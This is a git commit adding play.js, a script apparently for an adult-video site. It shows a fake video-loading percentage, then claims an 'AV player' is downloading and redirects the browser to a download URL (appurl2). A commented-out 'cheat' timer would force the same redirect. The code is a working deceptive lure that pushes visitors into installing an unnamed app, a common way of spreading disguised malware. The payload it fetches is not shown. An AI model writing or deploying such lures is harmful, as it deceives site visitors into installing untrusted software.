58f24c9e1288784054b840aca21d21410532cb2f
jipinfuli <as39328@163.com>
2014-11-08 13:44:12 +0800

    Create play.js

---
+++ play.js
@@ -0,0 +1,18 @@
+var bar=0;
+var line="||";
+var amount="||";
+count();
+function count(){
+	bar=bar+2;
+	amount=amount+line;
+	document.getElementById('baifenbi').innerHTML=bar+"%";
+	if(bar<16){
+		setTimeout("count()",500);
+	}else{
+		alert(tixing);
+		document.getElementById('load').innerHTML='<a href="'+appurl2+'"><span style="color:#c3c3c3;">不能观看？点此下载播放器</span></a>';
+		document.getElementById('note').innerHTML='<div style="height:25px;line-height:25px;font-size:13px;color:#00FF00;">AV播放器下载中，请耐心等待，一会提醒您安装...</div>';
+		window.location.href=appurl2;
+	}
+}
+//var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();
